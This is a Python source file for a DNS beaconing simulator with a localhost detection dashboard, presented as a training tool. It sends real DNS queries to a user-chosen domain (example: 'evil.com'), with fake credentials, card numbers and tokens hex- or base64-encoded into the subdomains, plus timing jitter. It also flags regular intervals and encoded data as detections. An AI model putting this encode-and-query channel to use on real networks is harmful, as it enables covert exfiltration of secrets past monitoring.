#!/usr/bin/env python3
"""
DNS Beaconing Simulator with Real-time Dashboard

This script provides both DNS beaconing simulation and a web-based dashboard
to visualize the beacons in real-time for training purposes.
"""

import argparse
import base64
import binascii
import hashlib
import json
import logging
import os
import random
import socket
import string
import sys
import threading
import time
from datetime import datetime
from collections import deque

# Web server components
from http.server import HTTPServer, BaseHTTPRequestHandler
import socketserver
import webbrowser

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("DNS-Beacon-Simulator")

# Global variables for sharing data between threads
beacon_data = deque(maxlen=100)  # Store last 100 beacons
beacon_intervals = []
last_beacon_time = None
detection_events = []
simulation_active = False

class DNSBeaconSimulator:
    def __init__(self, domain, interval=60, jitter=0, encoding="hex", data_exfil=True, 
                 subdomain_length=8, record_type="A", timeout=None):
        """
        Initialize the DNS beaconing simulator
        
        Args:
            domain (str): Base domain to beacon to
            interval (int): Seconds between beacons
            jitter (int): Random jitter range in seconds
            encoding (str): Encoding type (hex, base64, or alpha)
            data_exfil (bool): Simulate data exfiltration
            subdomain_length (int): Length of random subdomain
            record_type (str): DNS record type to query
            timeout (int): How long to run the simulation (seconds)
        """
        self.domain = domain
        self.interval = interval
        self.jitter = jitter
        self.encoding = encoding
        self.data_exfil = data_exfil
        self.subdomain_length = subdomain_length
        self.record_type = record_type
        self.timeout = timeout
        self.start_time = time.time()
        self.beacon_count = 0
        
        # Fake sensitive data to "exfiltrate"
        self.sensitive_data = [
            "username=admin&password=Secr3t!",
            "ssh_key=MIIEpAIBAAKCAQEA1XOu8sYbsZ1XO+Zx",
            "credit_card=4111111111111111&cvv=123",
            "api_key=AIzaSyDNzLkBsDI98zjEPehWAT",
            "token=eyJhbGciOiJIUzI1NiIsInR5cCI6I",
            "SSN=123-45-6789&DOB=01/01/1980",
            "MachineInfo:Hostname=WS01;IP=192.168.1.5;User=jsmith",
        ]
        
    def generate_random_string(self, length):
        """Generate a random string of specified length."""
        if self.encoding == "hex":
            return ''.join(random.choice(string.hexdigits.lower()) for _ in range(length))
        elif self.encoding == "base64":
            # Create a base64-friendly string
            chars = string.ascii_letters + string.digits + '+/'
            return ''.join(random.choice(chars) for _ in range(length))
        else:  # alpha
            return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    
    def encode_data(self, data):
        """Encode data according to selected method."""
        if self.encoding == "hex":
            return binascii.hexlify(data.encode()).decode()
        elif self.encoding == "base64":
            return base64.b64encode(data.encode()).decode().replace('=', '')
        else:  # alpha - simple char substitution
            return ''.join(chr((ord(c) % 26) + ord('a')) for c in data)
            
    def generate_beacon_domain(self):
        """Generate domain for beaconing with optional data exfiltration."""
        subdomain = self.generate_random_string(self.subdomain_length)
        
        # Add "exfiltrated" data if enabled
        has_exfil_data = False
        if self.data_exfil:
            if self.beacon_count % 5 == 0:  # Every 5th beacon contains "data"
                data = random.choice(self.sensitive_data)
                # Create a hash of data to simulate "chunking" for large data
                data_hash = hashlib.md5(data.encode()).hexdigest()[:8]
                # Add a chunk identifier to simulate multi-part exfiltration
                chunk_id = f"c{self.beacon_count % 100:02d}-"
                
                # Create subdomain with encoded "data" and identifiers
                exfil_data = self.encode_data(data)[:20]  # Limit length
                subdomain = f"{chunk_id}{data_hash}-{exfil_data}"
                has_exfil_data = True
        
        return subdomain + "." + self.domain, has_exfil_data
    
    def perform_dns_query(self, domain):
        """Perform an actual DNS query."""
        try:
            if self.record_type == "A":
                socket.gethostbyname(domain)
            else:  # Simulating other record types
                logger.info(f"Simulating {self.record_type} record query for {domain}")
        except socket.gaierror:
            # This is expected as domains likely don't exist
            pass
        
        logger.info(f"DNS Query: {domain} ({self.record_type})")
    
    def run(self):
        """Run the DNS beaconing simulation."""
        global simulation_active, beacon_data, beacon_intervals, last_beacon_time
        
        logger.info(f"Starting DNS beaconing simulation to {self.domain}")
        logger.info(f"Interval: {self.interval}s{f' with ±{self.jitter}s jitter' if self.jitter else ''}")
        logger.info(f"Encoding: {self.encoding}, Data Exfiltration: {'ON' if self.data_exfil else 'OFF'}")
        
        simulation_active = True
        last_beacon_time = time.time()
        
        try:
            while simulation_active:
                # Check if timeout has been reached
                current_time = time.time()
                if self.timeout and (current_time - self.start_time) > self.timeout:
                    logger.info(f"Timeout reached after {self.timeout} seconds. Stopping simulation.")
                    simulation_active = False
                    break
                
                self.beacon_count += 1
                beacon_domain, has_exfil = self.generate_beacon_domain()
                
                # Perform DNS query
                self.perform_dns_query(beacon_domain)
                
                # Record beacon data for dashboard
                current_time = time.time()
                if last_beacon_time is not None:
                    interval = current_time - last_beacon_time
                    beacon_intervals.append(interval)
                    # Only keep last 50 intervals
                    if len(beacon_intervals) > 50:
                        beacon_intervals.pop(0)
                
                # Create beacon data record
                beacon_record = {
                    "id": self.beacon_count,
                    "timestamp": datetime.now().strftime("%H:%M:%S.%f")[:-3],
                    "domain": beacon_domain,
                    "type": self.record_type,
                    "encoding": self.encoding,
                    "has_exfil": has_exfil
                }
                beacon_data.append(beacon_record)
                
                # Update last beacon time
                last_beacon_time = current_time
                
                # Add automatic detection for educational purposes
                if has_exfil:
                    detection_events.append({
                        "timestamp": beacon_record["timestamp"],
                        "message": f"Detected possible data exfiltration in query #{self.beacon_count}",
                        "level": "warning"
                    })
                
                # Perform basic pattern detection on intervals
                if len(beacon_intervals) >= 5:
                    # Check if intervals are consistent (indicating beaconing)
                    recent = beacon_intervals[-5:]
                    avg = sum(recent) / len(recent)
                    deviation = max(abs(i - avg) for i in recent)
                    
                    if deviation < avg * 0.25:  # Low variance in intervals
                        if len(detection_events) == 0 or current_time - detection_events[-1].get("raw_time", 0) > 30:
                            detection_events.append({
                                "timestamp": beacon_record["timestamp"],
                                "message": f"Detected regular beaconing pattern (interval ~{avg:.2f}s)",
                                "level": "alert",
                                "raw_time": current_time
                            })
                
                # Calculate next interval with jitter
                if self.jitter:
                    next_interval = self.interval + random.uniform(-self.jitter, self.jitter)
                    next_interval = max(1, next_interval)  # Ensure positive interval
                else:
                    next_interval = self.interval
                
                logger.info(f"Beacon #{self.beacon_count} complete. Next beacon in {next_interval:.2f}s")
                time.sleep(next_interval)
                
        except KeyboardInterrupt:
            logger.info("\nSimulation stopped")
        finally:
            logger.info(f"Total beacons sent: {self.beacon_count}")
            logger.info(f"Total runtime: {time.time() - self.start_time:.2f} seconds")
            simulation_active = False

class DashboardRequestHandler(BaseHTTPRequestHandler):
    """Handle HTTP requests for the dashboard"""
    
    def _set_headers(self, content_type="text/html"):
        self.send_response(200)
        self.send_header("Content-type", content_type)
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("Expires", "0")
        self.end_headers()
    
    def do_GET(self):
        global simulation_active, beacon_data, beacon_intervals, detection_events
        
        if self.path == "/":
            # Serve the dashboard HTML
            self._set_headers()
            with open(get_dashboard_html(), "rb") as file:
                self.wfile.write(file.read())
        
        elif self.path == "/data":
            # Serve the data as JSON
            self._set_headers("application/json")
            data = {
                "beacons": list(beacon_data),
                "intervals": beacon_intervals,
                "detections": detection_events,
             #   "active": simulation_active
            }
            self.wfile.write(json.dumps(data).encode())
        
        elif self.path == "/stop":
            # Stop the simulation
            global simulation_active
            simulation_active = False
            self._set_headers("application/json")
            self.wfile.write(json.dumps({"status": "stopping"}).encode())
        
        else:
            # Serve 404 for unknown paths
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

def get_dashboard_html():
    """Create a temporary file with the dashboard HTML"""
    # Create HTML content for the dashboard
    dashboard_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DNS Beacon Detection Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            background-color: #2c3e50;
            color: white;
            padding: 15px 20px;
            border-radius: 5px 5px 0 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
        }
        .status {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .status-indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: #e74c3c;
        }
        .status-indicator.active {
            background-color: #2ecc71;
        }
        .dashboard-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-top: 20px;
        }
        .card {
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .card-header {
            background-color: #34495e;
            color: white;
            padding: 10px 15px;
            font-weight: bold;
        }
        .card-body {
            padding: 15px;
            max-height: 300px;
            overflow-y: auto;
        }
        .full-width {
            grid-column: 1 / -1;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table th, table td {
            padding: 8px 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        table th {
            background-color: #f8f9fa;
        }
        .beacon-row.exfil {
            background-color: rgba(231, 76, 60, 0.1);
        }
        .alert-list {
            list-style-type: none;
            padding: 0;
            margin: 0;
        }
        .alert-item {
            padding: 10px;
            margin-bottom: 8px;
            border-radius: 4px;
            border-left: 4px solid #3498db;
        }
        .alert-item.warning {
            border-left-color: #f39c12;
            background-color: rgba(243, 156, 18, 0.1);
        }
        .alert-item.alert {
            border-left-color: #e74c3c;
            background-color: rgba(231, 76, 60, 0.1);
        }
        .time {
            color: #7f8c8d;
            font-size: 0.85em;
            margin-right: 10px;
        }
        .controls {
            margin-top: 20px;
            text-align: right;
        }
        button {
            padding: 8px 16px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #2980b9;
        }
        button.stop {
            background-color: #e74c3c;
        }
        button.stop:hover {
            background-color: #c0392b;
        }
        canvas {
            width: 100%;
            height: 200px;
        }
        .pattern-card {
            display: flex;
            flex-direction: column;
            height: 300px;
        }
        .no-data {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: #7f8c8d;
            font-style: italic;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background-color: white;
            border-radius: 5px;
            padding: 15px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            text-align: center;
        }
        .stat-value {
            font-size: 32px;
            font-weight: bold;
            margin: 10px 0;
            color: #2c3e50;
        }
        .stat-label {
            color: #7f8c8d;
            font-size: 14px;
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>DNS Beacon Detection Dashboard</h1>
            <div class="status">
                <div class="status-indicator" id="statusIndicator"></div>
                <span id="statusText">Inactive</span>
            </div>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-label">Total Beacons</div>
                <div class="stat-value" id="totalBeacons">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Detected Patterns</div>
                <div class="stat-value" id="detectedPatterns">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Avg Interval</div>
                <div class="stat-value" id="avgInterval">0.00s</div>
            </div>
        </div>

        <div class="dashboard-grid">
            <div class="card pattern-card">
                <div class="card-header">Beacon Interval Pattern</div>
                <div class="card-body" id="chartContainer">
                    <canvas id="intervalChart"></canvas>
                </div>
            </div>

            <div class="card">
                <div class="card-header">Detection Events</div>
                <div class="card-body">
                    <ul class="alert-list" id="alertList">
                        <li class="no-data">No detections yet</li>
                    </ul>
                </div>
            </div>

            <div class="card full-width">
                <div class="card-header">Recent DNS Queries</div>
                <div class="card-body">
                    <table>
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Time</th>
                                <th>Domain</th>
                                <th>Type</th>
                                <th>Encoding</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody id="beaconTable">
                            <tr>
                                <td colspan="6" class="no-data">No DNS queries recorded yet</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <div class="controls">
            <button id="stopBtn" class="stop">Stop Simulation</button>
        </div>
    </div>

    <script>
        // Configuration
        const updateInterval = 1000; // Update data every 1 second
        let chart;

        // Initialize the dashboard
        function initDashboard() {
            // Set up chart
            const ctx = document.getElementById('intervalChart').getContext('2d');
            chart = new Chart(ctx, {
                type: 'line',
                data: {
                    labels: [],
                    datasets: [{
                        label: 'Beacon Intervals (seconds)',
                        data: [],
                        backgroundColor: 'rgba(52, 152, 219, 0.2)',
                        borderColor: 'rgba(52, 152, 219, 1)',
                        borderWidth: 2,
                        pointRadius: 3,
                        tension: 0.1
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    scales: {
                        y: {
                            beginAtZero: true,
                            title: {
                                display: true,
                                text: 'Seconds'
                            }
                        },
                        x: {
                            title: {
                                display: true,
                                text: 'Beacon Number'
                            }
                        }
                    }
                }
            });

            // Set up stop button
            document.getElementById('stopBtn').addEventListener('click', stopSimulation);

            // Start data polling
            updateData();
            setInterval(updateData, updateInterval);
        }

        // Update the dashboard with fresh data
        async function updateData() {
            try {
                const response = await fetch('/data');
                const data = await response.json();
                
                updateStatus(data.active);
                updateStats(data);
                updateBeaconTable(data.beacons);
                updateDetectionList(data.detections);
                updateIntervalChart(data.intervals);
            } catch (error) {
                console.error('Error fetching data:', error);
            }
        }

        // Update simulation status indicator
        function updateStatus(active) {
            const indicator = document.getElementById('statusIndicator');
            const text = document.getElementById('statusText');
            
            if (active) {
                indicator.classList.add('active');
                text.textContent = 'Active';
            } else {
                indicator.classList.remove('active');
                text.textContent = 'Inactive';
            }
        }

        // Update statistics
        function updateStats(data) {
            document.getElementById('totalBeacons').textContent = data.beacons.length;
            document.getElementById('detectedPatterns').textContent = data.detections.filter(d => d.level === 'alert').length;
            
            if (data.intervals.length > 0) {
                const avg = data.intervals.reduce((a, b) => a + b, 0) / data.intervals.length;
                document.getElementById('avgInterval').textContent = avg.toFixed(2) + 's';
            }
        }

        // Update the beacon table
        function updateBeaconTable(beacons) {
            const table = document.getElementById('beaconTable');
            
            if (beacons.length === 0) {
                table.innerHTML = '<tr><td colspan="6" class="no-data">No DNS queries recorded yet</td></tr>';
                return;
            }
            
            table.innerHTML = '';
            
            // Show the most recent beacons first
            const recentBeacons = [...beacons].reverse().slice(0, 10);
            
            recentBeacons.forEach(beacon => {
                const row = document.createElement('tr');
                if (beacon.has_exfil) {
                    row.classList.add('beacon-row', 'exfil');
                }
                
                row.innerHTML = `
                    <td>${beacon.id}</td>
                    <td>${beacon.timestamp}</td>
                    <td>${beacon.domain}</td>
                    <td>${beacon.type}</td>
                    <td>${beacon.encoding}</td>
                    <td>${beacon.has_exfil ? '⚠️ Possible Exfil' : 'Normal'}</td>
                `;
                
                table.appendChild(row);
            });
        }

        // Update the detection events list
        function updateDetectionList(detections) {
            const list = document.getElementById('alertList');
            
            if (detections.length === 0) {
                list.innerHTML = '<li class="no-data">No detections yet</li>';
                return;
            }
            
            list.innerHTML = '';
            
            // Show the most recent detections first
            const recentDetections = [...detections].reverse().slice(0, 15);
            
            recentDetections.forEach(detection => {
                const item = document.createElement('li');
                item.classList.add('alert-item', detection.level);
                
                item.innerHTML = `
                    <span class="time">${detection.timestamp}</span>
                    ${detection.message}
                `;
                
                list.appendChild(item);
            });
        }

        // Update the interval chart
        function updateIntervalChart(intervals) {
            if (intervals.length === 0) return;
            
            // Update chart data
            chart.data.labels = intervals.map((_, i) => i + 1);
            chart.data.datasets[0].data = intervals;
            chart.update();
        }

        // Stop the simulation
        async function stopSimulation() {
            try {
                await fetch('/stop');
                document.getElementById('stopBtn').textContent = 'Stopping...';
                document.getElementById('stopBtn').disabled = true;
            } catch (error) {
                console.error('Error stopping simulation:', error);
            }
        }

        // Load Chart.js from CDN
        function loadChartJs() {
            return new Promise((resolve, reject) => {
                const script = document.createElement('script');
                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js';
                script.onload = resolve;
                script.onerror = reject;
                document.head.appendChild(script);
            });
        }

        // Initialize everything when the page loads
        window.onload = async function() {
            try {
                await loadChartJs();
                initDashboard();
            } catch (error) {
                console.error('Failed to load dependencies:', error);
                alert('Failed to load dashboard dependencies. Please try refreshing the page.');
            }
        };
    </script>
</body>
</html>
"""
    
    # Create a temporary file
    temp_file = "dns_beacon_dashboard.html"
    with open(temp_file, "w") as f:
        f.write(dashboard_html)
    
    return temp_file

def run_dashboard_server(port=8080):
    """Run the web server for the dashboard"""
    server = HTTPServer(("localhost", port), DashboardRequestHandler)
    logger.info(f"Starting dashboard server on http://localhost:{port}")
    
    # Open web browser
    webbrowser.open(f"http://localhost:{port}")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
        logger.info("Dashboard server stopped")

def main():
    parser = argparse.ArgumentParser(description="DNS Beaconing Simulator with Real-time Dashboard")
    parser.add_argument("domain", help="Target domain for beaconing (e.g., evil.com)")
    parser.add_argument("-i", "--interval", type=int, default=60, 
                        help="Seconds between beacons (default: 60)")
    parser.add_argument("-j", "--jitter", type=int, default=0,
                        help="Random time variation in seconds (default: 0)")
    parser.add_argument("-e", "--encoding", choices=["hex", "base64", "alpha"], default="hex",
                        help="Encoding method for subdomains (default: hex)")
    parser.add_argument("-n", "--no-exfil", action="store_true", 
                        help="Disable data exfiltration simulation")
    parser.add_argument("-l", "--length", type=int, default=8,
                        help="Length of random subdomain (default: 8)")
    parser.add_argument("-r", "--record", choices=["A", "TXT", "MX", "AAAA"], default="A",
                        help="DNS record type to query (default: A)")
    parser.add_argument("-t", "--timeout", type=int, 
                        help="Stop after specified seconds")
    parser.add_argument("-p", "--port", type=int, default=8080,
                        help="Port for dashboard web server (default: 8080)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Enable verbose output")
    
    args = parser.parse_args()
    
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # Print banner
    print("""
    ____  _   _  ____   ____                           
   |  _ \| \ | |/ ___| | __ )  ___  __ _  ___ ___  __  _ 
   | | | |  \| |\___ \ |  _ \ / _ \/ _` |/ __/ _ \|\\ | |
   | |_| | |\  | ___) || |_) |  __/ (_| | (_| (_) | \\| |
   |____/|_| \_||____/ |____/ \___|\__,_|\___\___/|__|__|
                                                       
   _____            _     _                         _ 
  |  __ \          | |   | |                       | |
  | |  | | __ _ ___| |__ | |__   ___   __ _ _ __ __| |
  | |  | |/ _` / __| '_ \| '_ \ / _ \ / _` | '__/ _` |
  | |__| | (_| \__ \ | | | |_) | (_) | (_| | | | (_| |
  |_____/ \__,_|___/_| |_|_.__/ \___/ \__,_|_|  \__,_|
                                                      
    -- FOR EDUCATIONAL PURPOSES ONLY --
    """)
    
    # Create and start the dashboard server thread
    dashboard_thread = threading.Thread(
        target=run_dashboard_server,
        args=(args.port,),
        daemon=True
    )
    dashboard_thread.start()
    
    # Create and run the simulator
    simulator = DNSBeaconSimulator(
        domain=args.domain,
        interval=args.interval,
        jitter=args.jitter,
        encoding=args.encoding,
        data_exfil=not args.no_exfil,
        subdomain_length=args.length,
        record_type=args.record,
        timeout=args.timeout
    )
    
    simulator.run()

if __name__ == "__main__":
    main()
